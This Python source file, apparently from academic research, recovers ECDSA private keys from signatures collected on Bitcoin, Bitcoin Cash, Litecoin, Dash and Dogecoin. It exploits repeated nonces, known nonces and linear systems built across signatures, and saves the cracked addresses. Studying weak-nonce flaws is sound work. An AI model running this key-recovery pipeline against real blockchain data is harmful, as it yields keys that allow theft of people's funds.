import os
import ecdsa
from ecdsa.curves import Curve
from keys_recovery.SignatureDB import SignatureDB, SignatureFolder
from keys_recovery.ecdsa_helper import (
    derive_nonce_from_known_private_key,
    derive_private_key_from_known_nonce,
    derive_private_key_from_repeated_nonces,
    solve_for_all_alterations,
)
import logging

logger = logging.getLogger(__name__)
logging.basicConfig(
    encoding="utf-8",
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
    datefmt="%m/%d/%Y %H:%M:%S",
)


class ECDSABreaker:
    def __init__(
        self, signature_folders: list[SignatureFolder], curve: Curve, out_folder: str
    ) -> None:
        logger.info(
            "Loading the signatures... This might take some time especially if the option to check the signatures is enabled."
        )
        self.db = SignatureDB(signature_folders, curve=curve)
        self.log_stats()
        self.curve = curve
        self.out_folder = out_folder

    def crack(self):
        logger.info("ROUND 0: Derive nonces and private keys from repeated nonces")
        self.__crack_repeated_nonces()

        logger.info(
            "ROUND 1: Derive nonces from known private keys and private keys from known nonces"
        )
        self.__crack_from_known_nonces_and_keys()

        logger.info(
            "ROUND 2: Derive nonces and private keys from signatures that form a system of linear equations."
        )
        self.__crack_from_sig_equation_system()

        logger.info(
            "ROUND 3: Derive nonces from known private keys and private keys from known nonces"
        )
        self.__crack_from_known_nonces_and_keys()

        logger.info("-" * 25 + "RESULTS: " + "-" * 25)
        self.log_stats()
        self.db.save_addresses(os.path.join(self.out_folder, "addresses.parquet"))

    def log_stats(self, level=0):
        stats = self.db.get_stats()
        logger.info(
            "   " * level
            + f"{'Private keys':15s}: {stats['cracked_keys_cnt'] / stats['pubkeys_cnt'] * 100:.2f}% - {stats['cracked_keys_cnt']} over {stats['pubkeys_cnt']} private keys recovered."
        )
        logger.info(
            "   " * level
            + f"{'Nonces':15s}: {stats['cracked_nonces_cnt'] / stats['r_cnt'] * 100:.2f}% - {stats['cracked_nonces_cnt']} over {stats['r_cnt']} nonces recovered."
        )

    def __crack_repeated_nonces(self):
        repeated_nonces_df = self.db.find_repeated_nonces()
        repeated_nonces_df[["nonce", "privkey"]] = repeated_nonces_df.apply(
            lambda row: derive_private_key_from_repeated_nonces(
                row["r"], row["s"], row["digests"], row["pubkey"], self.curve
            ),
            axis=1,
            result_type="expand",
        )
        self.db.expand_known_nonce(repeated_nonces_df)
        repeated_nonces_df["vulnerability_source"] = "repeated_nonces"
        self.db.expand_cracked_keys(repeated_nonces_df)

    def __crack_from_known_nonces_and_keys(self):
        crackable_keys, crackable_nonces = self.db.get_crackable_keys_and_nonces()

        while len(crackable_keys.index) > 0 or len(crackable_nonces.index) > 0:
            if len(crackable_keys.index) > 0:
                crackable_keys["privkey"] = crackable_keys.apply(
                    lambda row: derive_private_key_from_known_nonce(
                        row["r"],
                        row["s"],
                        row["h"],
                        row["nonce"],
                        row["pubkey"],
                        self.curve,
                    ),
                    axis=1,
                )
                crackable_keys["vulnerability_source"] = "known_nonces"
                self.db.expand_cracked_keys(crackable_keys)

            if len(crackable_nonces.index) > 0:
                crackable_nonces["nonce"] = crackable_nonces.apply(
                    lambda row: derive_nonce_from_known_private_key(
                        row["r"],
                        row["s"],
                        row["h"],
                        row["privkey"],
                    ),
                    axis=1,
                )
                self.db.expand_known_nonce(crackable_nonces)

            self.log_stats(level=1)
            crackable_keys, crackable_nonces = self.db.get_crackable_keys_and_nonces()

    def __crack_from_sig_equation_system(self):
        def build_system_matrix(rows, pubkeys: list[str], r: list[int]):
            if len(rows) % 2:
                raise ValueError("The number of signatures should be even.")
            if len(pubkeys) != len(r) or len(pubkeys) * 2 != len(rows):
                raise ValueError(
                    "The number of public keys and distinct 'r' values should be equal to the half of the number of signatures."
                )

            pk_to_pos = {pk: i for i, pk in enumerate(pubkeys)}
            r_to_pos = {r_val: i for i, r_val in enumerate(r)}
            dim = len(pubkeys) * 2
            m = [[0 for _ in range(dim)] for _ in range(dim)]
            b = []

            for i, tuple in enumerate(rows.itertuples()):
                pk, r_val, s, h = (tuple.pubkey, tuple.r, tuple.s, tuple.h)
                m[i][r_to_pos[r_val]] = s
                m[i][pk_to_pos[pk] + dim // 2] = -r_val % ecdsa.SECP256k1.order
                b.append(h)

            return m, b

        cycle_signatures = self.db.get_cycle_signatures()
        logger.info(
            f"   {len(cycle_signatures)} basis cycles have been found in the bi-partite graph of uncracked keys.",
        )
        cycle_signatures = cycle_signatures.set_index(keys="cycle_id")

        for id in sorted(cycle_signatures.index.unique()):
            rows = cycle_signatures.loc[:].loc[id]
            pubkeys = rows["pubkey"].unique()
            r = rows["r"].unique()
            m, b = build_system_matrix(rows, pubkeys, r)
            nonces, private_keys = solve_for_all_alterations(m, b, pubkeys, r)

            rows["privkey"] = rows.apply(
                lambda row: private_keys[row["pubkey"]], axis=1
            )
            rows["vulnerable_timestamp"] = rows["block_timestamp"].max()
            rows["vulnerability_source"] = "equation_system"
            self.db.expand_cracked_keys(rows)

            rows["nonce"] = rows.apply(lambda row: nonces[row["r"]], axis=1)
            self.db.expand_known_nonce(rows)

        cycle_signatures.reset_index()


if __name__ == "__main__":
    signature_folders = [
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/bch",
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/btc"
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/dash"
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/ltc"
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/doge"
        ),
    ]

    out_folder = "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/confidential"

    breaker = ECDSABreaker(
        signature_folders,
        ecdsa.SECP256k1,
        out_folder,
    )
    breaker.crack()
